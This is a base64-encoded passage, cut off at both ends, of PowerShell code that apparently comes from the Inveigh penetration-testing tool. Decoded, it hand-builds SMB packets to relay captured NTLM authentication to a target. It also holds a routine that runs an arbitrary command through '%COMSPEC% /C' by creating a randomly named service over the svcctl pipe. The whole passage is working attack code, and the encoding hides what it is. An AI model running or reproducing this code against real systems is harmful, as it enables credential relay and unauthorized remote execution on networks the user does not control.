AgICAgICAgJFNNQl9sZW5ndGhfMiA9ICRTTUJfbGVuZ3RoXzIgLXJlcGxhY2UgIi0wMC0wMCIsIiIKICAgICAgICAkU01CX2xlbmd0aF8yID0gJFNNQl9sZW5ndGhfMi5TcGxpdCgiLSIpIHwgRm9yRWFjaC1PYmplY3R7W0NoYXJdW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkXywxNil9CiAgICAgICAgJFNNQl9sZW5ndGhfMyA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkSFRUUF9yZXF1ZXN0X2J5dGVzLkxlbmd0aCArIDQpKQogICAgICAgICRTTUJfbGVuZ3RoXzMgPSAkU01CX2xlbmd0aF8zIC1yZXBsYWNlICItMDAtMDAiLCIiCiAgICAgICAgJFNNQl9sZW5ndGhfMyA9ICRTTUJfbGVuZ3RoXzMuU3BsaXQoIi0iKSB8IEZvckVhY2gtT2JqZWN0e1tDaGFyXVtTeXN0ZW0uQ29udmVydF06OlRvSW50MTYoJF8sMTYpfQogICAgICAgICRTTUJfTlRMTVNTUF9sZW5ndGggPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJEhUVFBfcmVxdWVzdF9ieXRlcy5MZW5ndGgpKQogICAgICAgICRTTUJfTlRMTVNTUF9sZW5ndGggPSAkU01CX05UTE1TU1BfbGVuZ3RoIC1yZXBsYWNlICItMDAtMDAiLCIiCiAgICAgICAgJFNNQl9OVExNU1NQX2xlbmd0aCA9ICRTTUJfTlRMTVNTUF9sZW5ndGguU3BsaXQoIi0iKSB8IEZvckVhY2gtT2JqZWN0e1tDaGFyXVtTeXN0ZW0uQ29udmVydF06OlRvSW50MTYoJF8sMTYpfQogICAgICAgICRTTUJfYmxvYl9sZW5ndGggPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJEhUVFBfcmVxdWVzdF9ieXRlcy5MZW5ndGggKyAxNikpCiAgICAgICAgJFNNQl9ibG9iX2xlbmd0aCA9ICRTTUJfYmxvYl9sZW5ndGggLXJlcGxhY2UgIi0wMC0wMCIsIiIKICAgICAgICAkU01CX2Jsb2JfbGVuZ3RoID0gJFNNQl9ibG9iX2xlbmd0aC5TcGxpdCgiLSIpIHwgRm9yRWFjaC1PYmplY3R7W0NoYXJdW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkXywxNil9CiAgICAgICAgJFNNQl9ieXRlX2NvdW50ID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZyhbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRIVFRQX3JlcXVlc3RfYnl0ZXMuTGVuZ3RoICsgMjcpKQogICAgICAgICRTTUJfYnl0ZV9jb3VudCA9ICRTTUJfYnl0ZV9jb3VudCAtcmVwbGFjZSAiLTAwLTAwIiwiIgogICAgICAgICRTTUJfYnl0ZV9jb3VudCA9ICRTTUJfYnl0ZV9jb3VudC5TcGxpdCgiLSIpIHwgRm9yRWFjaC1PYmplY3R7W0NoYXJdW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkXywxNil9CiAgICAgICAgJFNNQl9uZXRiaW9zX2xlbmd0aCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkSFRUUF9yZXF1ZXN0X2J5dGVzLkxlbmd0aCArIDg2KSkKICAgICAgICAkU01CX25ldGJpb3NfbGVuZ3RoID0gJFNNQl9uZXRiaW9zX2xlbmd0aCAtcmVwbGFjZSAiLTAwLTAwIiwiIgogICAgICAgICRTTUJfbmV0Ymlvc19sZW5ndGggPSAkU01CX25ldGJpb3NfbGVuZ3RoLlNwbGl0KCItIikgfCBGb3JFYWNoLU9iamVjdHtbQ2hhcl1bU3lzdGVtLkNvbnZlcnRdOjpUb0ludDE2KCRfLDE2KX0KICAgICAgICBbQXJyYXldOjpSZXZlcnNlKCRTTUJfbGVuZ3RoXzEpCiAgICAgICAgW0FycmF5XTo6UmV2ZXJzZSgkU01CX2xlbmd0aF8yKQogICAgICAgIFtBcnJheV06OlJldmVyc2UoJFNNQl9sZW5ndGhfMykKICAgICAgICBbQXJyYXldOjpSZXZlcnNlKCRTTUJfTlRMTVNTUF9sZW5ndGgpCiAgICAgICAgW0FycmF5XTo6UmV2ZXJzZSgkU01CX25ldGJpb3NfbGVuZ3RoKQogICAgICAgICRqID0gMAogICAgICAgIAogICAgICAgIDpTTUJfcmVsYXlfcmVzcG9uc2VfbG9vcCB3aGlsZSAoJGogLWx0IDEpCiAgICAgICAgewogICAgICAgICAgICAkU01CX3JlbGF5X3Jlc3BvbnNlX3NlbmQgPSAweDAwLDB4MDAgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9uZXRiaW9zX2xlbmd0aCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweGZmLDB4NTMsMHg0ZCwweDQyLDB4NzMsMHgwMCwweDAwLDB4MDAsMHgwMCwweDE4LDB4MDEsMHg0OCwweDAwLDB4MDAsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4ZmYsMHhmZiArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5wcm9jZXNzX0lEX2J5dGVzICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfdXNlcl9JRCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwYywweGZmLDB4MDAsMHgwMCwweDAwLDB4ZmYsMHhmZiwweDAyLDB4MDAsMHgwMSwweDAwLDB4MDAsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2Jsb2JfbGVuZ3RoICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHg0NCwweDAwLDB4MDAsMHg4MCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2J5dGVfY291bnQgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHhhMSwweDgyICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfbGVuZ3RoXzEgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgzMCwweDgyICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfbGVuZ3RoXzIgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHhhMiwweDgyICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfbGVuZ3RoXzMgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwNCwweDgyICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfTlRMTVNTUF9sZW5ndGggKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEhUVFBfcmVxdWVzdF9ieXRlcyArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDU1LDB4NmUsMHg2OSwweDc4LDB4MDAsMHg1MywweDYxLDB4NmQsMHg2MiwweDYxLDB4MDAKCiAgICAgICAgICAgICRTTUJfcmVsYXlfcmVzcG9uc2Vfc3RyZWFtLldyaXRlKCRTTUJfcmVsYXlfcmVzcG9uc2Vfc2VuZCwwLCRTTUJfcmVsYXlfcmVzcG9uc2Vfc2VuZC5MZW5ndGgpCiAgICAgICAgCSRTTUJfcmVsYXlfcmVzcG9uc2Vfc3RyZWFtLkZsdXNoKCkKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmKCRTTUJSZWxheU5ldHdvcmtUaW1lb3V0KQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkU01CX3JlbGF5X3Jlc3BvbnNlX3RpbWVvdXQgPSBOZXctVGltZVNwYW4gLVNlY29uZHMgJFNNQlJlbGF5TmV0d29ya1RpbWVvdXQKICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfcmVzcG9uc2Vfc3RvcHdhdGNoID0gW1N1c3RlbS5EaWFnbm9zdGljcy5TdG9wd2F0Y2hdOjpTdGFydE5ldygpCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB3aGlsZSghJFNNQl9yZWxheV9yZXNwb25zZV9zdHJlYW0uRGF0YUF2YWlsYWJsZSkKICAgICAgICAgICAgICAgIHsKCiAgICAgICAgICAgICAgICAgICAgaWYoJFNNQl9yZWxheV9yZXNwb25zZV9zdG9wd2F0Y2guRWxhcHNlZCAtZ2UgJFNNQl9yZWxheV9yZXNwb25zZV90aW1lb3V0KQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIlNNQiByZWxheSB0YXJnZXQgZGlkbid0IHJlc3BvbmQgd2l0aGluICRTTUJSZWxheU5ldHdvcmtUaW1lb3V0IHNlY29uZHMiKQogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWyRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTTUIgcmVsYXkgdGFyZ2V0IGRpZG4ndCByZXNwb25kIHdpdGhpbiAkU01CUmVsYXlOZXR3b3JrVGltZW91dCBzZWNvbmRzIildKQogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5TTUJfcmVsYXlfYWN0aXZlX3N0ZXAgPSAwCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfc29ja2V0LkNsb3NlKCkKICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsgOlNNQl9yZWxheV9yZXNwb25zZV9sb29wCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICRTTUJfcmVsYXlfcmVzcG9uc2Vfc3RyZWFtLlJlYWQoJFNNQl9yZWxheV9yZXNwb25zZV9ieXRlcywwLCRTTUJfcmVsYXlfcmVzcG9uc2VfYnl0ZXMuTGVuZ3RoKQogICAgICAgICAgICAkaW52ZWlnaC5TTUJfcmVsYXlfYWN0aXZlX3N0ZXAgPSAyCiAgICAgICAgICAgICRqKysKICAgICAgICB9CgogICAgICAgIHJldHVybiAkU01CX3JlbGF5X3Jlc3BvbnNlX2J5dGVzCiAgICB9Cgp9CgojIFNNQiBSZWxheSBFeGVjdXRlIFNjcmlwdEJsb2NrIC0gZXhlY3V0ZXMgY29tbWFuZCB3aXRoaW4gYXV0aGVudGljYXRlZCBTTUIgc2Vzc2lvbgokU01CX3JlbGF5X2V4ZWN1dGVfc2NyaXB0YmxvY2sgPQp7CiAgICBmdW5jdGlvbiBTTUJSZWxheUV4ZWN1dGUKICAgIHsKICAgICAgICBwYXJhbSAoJFNNQl9yZWxheV9zb2NrZXQsJFNNQl91c2VyX0lEKQogICAgCiAgICAgICAgaWYgKCRTTUJfcmVsYXlfc29ja2V0KQogICAgICAgIHsKICAgICAgICAgICAgJFNNQl9yZWxheV9leGVjdXRlX3N0cmVhbSA9ICRTTUJfcmVsYXlfc29ja2V0LkdldFN0cmVhbSgpCiAgICAgICAgfQoKICAgICAgICAkU01CX3JlbGF5X2ZhaWxlZCA9ICRmYWxzZQogICAgICAgICRTTUJfcmVsYXlfZXhlY3V0ZV9ieXRlcyA9IE5ldy1PYmplY3QgU3lzdGVtLkJ5dGVbXSAxMDI0CiAgICAgICAgJFNNQl9zZXJ2aWNlX3JhbmRvbSA9IFtTdHJpbmddOjpKb2luKCIwMC0iLCgxLi4yMCB8IEZvckVhY2gtT2JqZWN0eyJ7MDpYMn0tIiAtZiAoR2V0LVJhbmRvbSAtTWluaW11bSA2NSAtTWF4aW11bSA5MCl9KSkKICAgICAgICAkU01CX3NlcnZpY2UgPSAkU01CX3NlcnZpY2VfcmFuZG9tIC1yZXBsYWNlICItMDAiLCIiCiAgICAgICAgJFNNQl9zZXJ2aWNlID0gJFNNQl9zZXJ2aWNlLlN1YnN0cmluZygwLCRTTUJfc2VydmljZS5MZW5ndGggLSAxKQogICAgICAgICRTTUJfc2VydmljZSA9ICRTTUJfc2VydmljZS5TcGxpdCgiLSIpIHwgRm9yRWFjaC1PYmplY3R7W0NoYXJdW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkXywxNil9CiAgICAgICAgJFNNQl9zZXJ2aWNlID0gTmV3LU9iamVjdCBTeXN0ZW0uU3RyaW5nICgkU01CX3NlcnZpY2UsMCwkU01CX3NlcnZpY2UuTGVuZ3RoKQogICAgICAgICRTTUJfc2VydmljZV9yYW5kb20gKz0gJzAwLTAwLTAwJwogICAgICAgIFtCeXRlW11dICRTTUJfc2VydmljZV9ieXRlcyA9ICRTTUJfc2VydmljZV9yYW5kb20uU3BsaXQoIi0iKSB8IEZvckVhY2gtT2JqZWN0e1tDaGFyXVtTeXN0ZW0uQ29udmVydF06OlRvSW50MTYoJF8sMTYpfQogICAgICAgICRTTUJfcmVmZXJlbnRfSURfYnl0ZXMgPSBbU3RyaW5nXSgxLi40IHwgRm9yRWFjaC1PYmplY3QgeyJ7MDpYMn0iIC1mIChHZXQtUmFuZG9tIC1NaW5pbXVtIDEgLU1heGltdW0gMjU1KX0pCiAgICAgICAgJFNNQl9yZWZlcmVudF9JRF9ieXRlcyA9ICRTTUJfcmVmZXJlbnRfSURfYnl0ZXMuU3BsaXQoIiAiKSB8IEZvckVhY2gtT2JqZWN0e1tDaGFyXVtTeXN0ZW0uQ29udmVydF06OlRvSW50MTYoJF8sMTYpfQogICAgICAgICRTTUJSZWxheUNvbW1hbmQgPSAiJUNPTVNQRUMlIC9DIGAiIiArICRTTUJSZWxheUNvbW1hbmQgKyAiYCIiCiAgICAgICAgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkU01CUmVsYXlDb21tYW5kKSB8IEZvckVhY2gtT2JqZWN0eyRTTUJfcmVsYXlfY29tbWFuZCArPSAiezA6WDJ9LTAwLSIgLWYgJF99CgogICAgICAgIGlmKFtCb29sXSgkU01CUmVsYXlDb21tYW5kLkxlbmd0aCAlIDIpKQogICAgICAgIHsKICAgICAgICAgICAgJFNNQl9yZWxheV9jb21tYW5kICs9ICcwMC0wMCcKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgJFNNQl9yZWxheV9jb21tYW5kICs9ICcwMC0wMC0wMC0wMCcKICAgICAgICB9ICAgIAogICAgICAgIAogICAgICAgIFtCeXRlW11dICRTTUJfcmVsYXlfY29tbWFuZF9ieXRlcyA9ICRTTUJfcmVsYXlfY29tbWFuZC5TcGxpdCgiLSIpIHwgRm9yRWFjaC1PYmplY3R7W0NoYXJdW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkXywxNil9CiAgICAgICAgJFNNQl9zZXJ2aWNlX2RhdGFfbGVuZ3RoX2J5dGVzID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkU01CX3JlbGF5X2NvbW1hbmRfYnl0ZXMuTGVuZ3RoICsgJFNNQl9zZXJ2aWNlX2J5dGVzLkxlbmd0aCArIDIzNykKICAgICAgICAkU01CX3NlcnZpY2VfZGF0YV9sZW5ndGhfYnl0ZXMgPSAkU01CX3NlcnZpY2VfZGF0YV9sZW5ndGhfYnl0ZXNbMi4uMF0KICAgICAgICAkU01CX3NlcnZpY2VfYnl0ZV9jb3VudF9ieXRlcyA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJFNNQl9yZWxheV9jb21tYW5kX2J5dGVzLkxlbmd0aCArICRTTUJfc2VydmljZV9ieXRlcy5MZW5ndGggKyAxNzQpCiAgICAgICAgJFNNQl9zZXJ2aWNlX2J5dGVfY291bnRfYnl0ZXMgPSAkU01CX3NlcnZpY2VfYnl0ZV9jb3VudF9ieXRlc1swLi4xXSAgIAogICAgICAgICRTTUJfcmVsYXlfY29tbWFuZF9sZW5ndGhfYnl0ZXMgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRTTUJfcmVsYXlfY29tbWFuZF9ieXRlcy5MZW5ndGggLyAyKQogICAgICAgICRrID0gMAoKICAgICAgICA6U01CX3JlbGF5X2V4ZWN1dGVfbG9vcCB3aGlsZSAoJGsgLWx0IDEyKQogICAgICAgIHsKCiAgICAgICAgICAgIHN3aXRjaCAoJGspCiAgICAgICAgICAgIHsKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAwCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9leGVjdXRlX3NlbmQgPSAweDAwLDB4MDAsMHgwMCwweDQ1LDB4ZmYsMHg1MywweDRkLDB4NDIsMHg3NSwweDAwLDB4MDAsMHgwMCwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDE4LDB4MDEsMHg0OCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHhmZiwweGZmICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gucHJvY2Vzc19JRF9ieXRlcyArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfdXNlcl9JRCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDA0LDB4ZmYsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDEsMHgwMCwweDFhLDB4MDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHg1YywweDVjLDB4MzEsMHgzMCwweDJlLDB4MzEsMHgzMCwweDJlLDB4MzIsMHgyZSwweDMxLDB4MzAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MzIsMHg1YywweDQ5LDB4NTAsMHg0MywweDI0LDB4MDAsMHgzZiwweDNmLDB4M2YsMHgzZiwweDNmLDB4MDAKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAxCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9leGVjdXRlX3NlbmQgPSAweDAwLDB4MDAsMHgwMCwweDViLDB4ZmYsMHg1MywweDRkLDB4NDIsMHhhMiwweDAwLDB4MDAsMHgwMCwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDE4LDB4MDIsMHgyOCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDA4ICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gucHJvY2Vzc19JRF9ieXRlcyArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfdXNlcl9JRCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDMsMHgwMCwweDE4LDB4ZmYsMHgwMCwweDAwLDB4MDAsMHgwMCwweDA3LDB4MDAsMHgxNiwweDAwLDB4MDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAyLDB4MDAsMHgwMCwweDAwLDB4MDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDA3LDB4MDAsMHgwMCwweDAwLDB4MDEsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMiwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDgsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHg1YywweDczLDB4NzYsMHg2MywweDYzLDB4NzQsMHg2YywweDAwCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIDIKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2V4ZWN1dGVfc2VuZCA9IDB4MDAsMHgwMCwweDAwLDB4ODcsMHhmZiwweDUzLDB4NGQsMHg0MiwweDJmLDB4MDAsMHgwMCwweDAwLDB4MDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MTgsMHgwNSwweDI4LDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDggKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5wcm9jZXNzX0lEX2J5dGVzICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl91c2VyX0lEICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwNCwweDAwLDB4MGUsMHhmZiwweDAwLDB4MDAsMHgwMCwweDAwLDB4NDAsMHhlYSwweDAzLDB4MDAsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHhmZiwweGZmLDB4ZmYsMHhmZiwweDA4LDB4MDAsMHg0OCwweDAwLDB4MDAsMHgwMCwweDQ4LDB4MDAsMHgzZiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4NDgsMHgwMCwweDA1LDB4MDAsMHgwYiwweDAzLDB4MTAsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4NDgsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweGQwLDB4MTYsMHhkMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgxNiwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDEsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDEsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg4MSwweGJiLDB4N2EsMHgzNiwweDQ0LDB4OTgsMHhmMSwweDM1LDB4YWQsMHgzMiwweDk4LDB4ZjAsMHgzOCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDEwLDB4MDMsMHgwMiwweDAwLDB4MDAsMHgwMCwweDA0LDB4NWQsMHg4OCwweDhhLDB4ZWIsMHgxYywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHhjOSwweDExLDB4OWYsMHhlOCwweDA4LDB4MDAsMHgyYiwweDEwLDB4NDgsMHg2MCwweDAyLDB4MDAsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMAogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAkU01CX211bHRpcGxleF9pZCA9IDB4MDUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAzCiAgICAgICAgICAgICAgICB7IAogICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfZXhlY3V0ZV9zZW5kID0gJFNNQl9yZWxheV9leGVjdXRlX1JlYWRBbmRSZXF1ZXN0CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIDQKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2V4ZWN1dGVfc2VuZCA9IDB4MDAsMHgwMCwweDAwLDB4OWIsMHhmZiwweDUzLDB4NGQsMHg0MiwweDJmLDB4MDAsMHgwMCwweDAwLDB4MDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MTgsMHgwNSwweDI4LDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDggKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5wcm9jZXNzX0lEX2J5dGVzICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl91c2VyX0lEICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwNiwweDAwLDB4MGUsMHhmZiwweDAwLDB4MDAsMHgwMCwweDAwLDB4NDAsMHhlYSwweDAzLDB4MDAsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHhmZiwweGZmLDB4ZmYsMHhmZiwweDA4LDB4MDAsMHg1MCwweDAwLDB4MDAsMHgwMCwweDVjLDB4MDAsMHgzZiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4NWMsMHgwMCwweDA1LDB4MDAsMHgwMCwweDAzLDB4MTAsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4NWMsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDM4LDB4MDAsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwZiwweDAwLDB4MDAsMHgwMCwweDAzLDB4MDAsMHgxNSwweDAwLDB4MDAsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCwweDE1LDB4MDAsMHgwMCwweDAwICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zZXJ2aWNlX2J5dGVzICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgzZiwweDAwLDB4MGYsMHgwMAogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAkU01CX211bHRpcGxleF9pZCA9IDB4MDcKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgNQogICAgICAgICAgICAgICAgeyAgCiAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9leGVjdXRlX3NlbmQgPSAkU01CX3JlbGF5X2V4ZWN1dGVfUmVhZEFuZFJlcXVlc3QKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgNgogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfZXhlY3V0ZV9zZW5kID0gW0FycmF5XTB4MDAgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3NlcnZpY2VfZGF0YV9sZW5ndGhfYnl0ZXMgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweGZmLDB4NTMsMHg0ZCwweDQyLDB4MmYsMHg